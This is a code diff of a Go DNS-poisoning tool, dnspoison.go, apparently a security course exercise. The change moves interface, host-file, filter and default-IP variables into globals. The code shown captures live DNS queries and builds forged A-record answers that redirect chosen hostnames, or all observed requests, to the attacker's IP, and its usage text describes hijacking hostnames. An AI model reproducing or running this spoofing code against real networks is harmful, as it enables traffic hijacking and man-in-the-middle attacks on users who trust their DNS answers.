@@ -21,6 +21,10 @@ import (
 )
 
 var (
+	ifcName       string // interface name
+	hostFile      string
+	bpfFilter     string
+	defaultIP     net.IP
 	ipHostMapping map[string]string
 
 	decoder       *gopacket.DecodingLayerParser
@@ -36,12 +40,7 @@ var (
 
 // go run dnspoison.go [-i interface] [-f hostnames] [expression]
 func main() {
-	var (
-		ifcName   string
-		hostFile  string
-		bpfFilter string
-	)
-	parseCommand(ifcName, hostFile, bpfFilter)
+	parseCommand()
 
 	// opens a device and returns a handle
 	handle, err := pcap.OpenLive(ifcName, 1600, true, pcap.BlockForever)
@@ -52,7 +51,7 @@ func main() {
 	}
 	defer handle.Close()
 
-	defaultIP := queryIfcAddr(ifcName)    // get ip addr relates to the specified interface
+	defaultIP = queryIfcAddr(ifcName)     // get ip addr relates to the specified interface
 	ipHostMapping = readMapping(hostFile) // read ip host mapping from file
 
 	setupDecoder()
@@ -64,12 +63,12 @@ func main() {
 			continue
 		}
 
-		handlePackets(defaultIP)
+		handlePackets()
 	}
 
 }
 
-func parseCommand(ifcName string, hostFile string, bpfFilter string) {
+func parseCommand() {
 	flag.StringVar(&ifcName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
 	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
 	flag.Usage = func() {
@@ -145,7 +144,7 @@ func setupDecoder() {
 	}
 }
 
-func handlePackets(defaultIP net.IP) {
+func handlePackets() {
 	fmt.Println("========== Packet captured! ==========")
 	fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
 	var i uint16
@@ -166,7 +165,7 @@ func handlePackets(defaultIP net.IP) {
 			continue
 		}
 
-		a := buildDNSAnswer(q, defaultIP)
+		a := buildDNSAnswer(q)
 		if a.IP != nil {
 			matched = true
 			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
@@ -193,18 +192,18 @@ func handlePackets(defaultIP net.IP) {
 	fmt.Println("Response sent")
 }
 
-func buildDNSAnswer(q layers.DNSQuestion, defaultIP net.IP) layers.DNSResourceRecord {
+func buildDNSAnswer(q layers.DNSQuestion) layers.DNSResourceRecord {
 	var a layers.DNSResourceRecord
 	a.Type = layers.DNSTypeA
 	a.Class = layers.DNSClassIN
 	a.TTL = 300
 	a.Name = q.Name
-	a.IP = getForgedIp(string(q.Name), defaultIP)
+	a.IP = getForgedIp(string(q.Name))
 	return a
 }
 
 // return nil if file is specified while corresponding host is not provided
-func getForgedIp(queryName string, defaultIP net.IP) net.IP {
+func getForgedIp(queryName string) net.IP {
 	if ipHostMapping == nil { // mapping file is not specified, use ip addr of interface
 		return defaultIP
 	} else if ipStr, ok := ipHostMapping[queryName]; ok { // use ip addr in mapping file
